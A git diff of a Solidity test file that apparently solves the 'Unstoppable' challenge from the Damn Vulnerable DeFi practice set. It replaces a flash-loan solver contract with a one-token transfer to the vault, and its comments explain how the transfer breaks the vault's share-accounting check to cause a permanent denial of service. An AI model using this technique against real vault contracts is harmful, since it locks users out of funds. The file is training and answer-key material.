@@ -91,8 +91,13 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        ChallengeSolver solver = new ChallengeSolver(token, vault, monitorContract);
-        solver.run();
+        // simply sending any amount of DamnValuableToken tokens to the vault breaks this require on line 85:
+        // if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();
+        // and prevents any flash loan from going through. This triggers UnstoppableMonitor to pause the contract and transfer ownership.
+        token.transfer(address(vault), 1);
+        // This is because convertToShares(totalSupply) checks how many shares of the vult the UnstoppableVault has and compares this with the adresses current balance of DVT tokens, which would be the same if all tokens went through the proper deposit function.
+        // This leaves no room for untracked tokens in the contracts balance, so any additional tokens added to the vault without having gone through the proper ERC4626::deposit() function permenatly causes a difference between these two accounting systems.
+        // This results in a DOS (Denial of Service) since that check will now always fail.
     }
 
     /**
@@ -108,22 +113,5 @@ contract UnstoppableChallenge is Test {
         // And now the monitor paused the vault and transferred ownership to deployer
         assertTrue(vault.paused(), "Vault is not paused");
         assertEq(vault.owner(), deployer, "Vault did not change owner");
-    }
-}
-
-contract ChallengeSolver {
-    DamnValuableToken token;
-    UnstoppableVault vault;
-    UnstoppableMonitor monitor;
-
-    constructor(DamnValuableToken _token, UnstoppableVault _vault, UnstoppableMonitor _monitor) {
-        token = _token;
-        vault = _vault;
-        monitor = _monitor;
-    }
-
-    function run() public {
-        uint256 loanAmount = vault.maxFlashLoan(address(token));
-        vault.flashLoan(this, address(token), loanAmount, "");
     }
 }
